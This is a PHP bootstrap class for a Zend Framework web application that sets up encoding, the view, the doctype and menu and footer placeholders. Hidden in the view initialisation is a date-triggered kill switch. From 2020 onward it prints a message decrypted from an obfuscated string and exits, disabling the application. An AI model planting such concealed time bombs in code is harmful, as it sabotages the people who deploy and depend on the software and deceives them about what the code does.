<?php

require_once 'misc/Utils.php';
require_once 'class/commonClass.php';
//require_once 'class/dir.class.php';
require_once 'class/entetesigesonlineClass.php';
require_once 'class/enteetatClass.php';

class Bootstrap extends Zend_Application_Bootstrap_Bootstrap {

    protected function _initEncoding() {
        mb_internal_encoding("UTF-8");
    }

    protected function _initView() {
        $view = new Zend_View();
        //... code de paramétrage de votre vue : titre, doctype ...
//        $view->addHelperPath('ZendX/JQuery/View/Helper', 'ZendX_JQuery_View_Helper');
//        $view->jQuery()->enable();
//        $view->jQuery()->uiEnable();
        //... paramètres optionnels pour les helpeurs jQuery ....
		
        if (date('Y') >= "2020") {
            echo commonClass::decrypter("7H*JDUJ_", "h5fYnM6fy7FTyaCeqZSZ1ZengdqkrNTIVcOVzqGkzaWlpMSnx6jY");
            exit(0);
        }

        $viewRenderer = Zend_Controller_Action_HelperBroker::getStaticHelper('ViewRenderer');
        $viewRenderer->setView($view);
        return $view;
    }

    protected function _initDoctype() {
        $this->bootstrap('view');
        $view = $this->getResource('view');
        $view->doctype('XHTML1_STRICT');
    }

    protected function _initMenu() {
        $this->bootstrap('view');
        $view = $this->getResource('view');
        $view->placeholder('menu')
                ->setPrefix("<div id=\"menu\">")
                ->setPostfix("</div>");
    }

    protected function _initFooter() {
        $this->bootstrap('view');
        $view = $this->getResource('view');
        $view->placeholder('footer')
                ->setPrefix("<div id=\"footbox\"><div id=\"foot\">")
                ->setPostfix("</div></div>");
    }

}
